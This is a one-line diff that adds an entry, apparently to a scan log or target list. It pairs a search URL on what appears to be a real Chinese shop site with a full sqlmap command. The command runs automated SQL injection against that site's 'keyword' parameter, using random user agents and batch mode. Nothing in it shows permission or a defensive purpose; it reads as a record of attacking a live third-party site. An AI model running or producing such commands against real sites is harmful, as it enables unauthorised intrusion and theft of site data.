@@ -1,0 +1,1 @@
+http://shop117095.daomenkou.cn:80/site/search?act=search&keyword=1 (GET)  # "D:\Program Files\Python\Python311\Scripts\sqlmap" -r sqlmap_requests_baseline\015_SQL_Injection_keyword_3885515566584170300.txt --batch --smart --random-agent --output-dir sqlmap_output_baseline\015_3885515566584170300 -p keyword
